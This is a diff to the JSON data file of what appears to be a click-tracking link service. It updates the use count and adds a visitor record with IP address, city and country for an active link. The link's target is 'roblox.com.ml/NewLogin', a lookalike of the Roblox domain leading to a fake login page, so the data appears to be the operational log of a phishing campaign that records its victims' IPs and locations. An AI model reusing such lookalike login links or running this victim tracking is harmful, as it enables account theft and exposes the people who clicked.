@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 57,
+    "useCount": 58,
     "createdBy": "admin",
     "clicks": [
       {
@@ -568,6 +568,14 @@
         "city": "Bucharest",
         "flag": "🇷🇴",
         "countryCode": "RO"
+      },
+      {
+        "timestamp": 1776876522450,
+        "ip": "196.32.249.93",
+        "country": "South Africa",
+        "city": "Durban",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
       }
     ]
   },
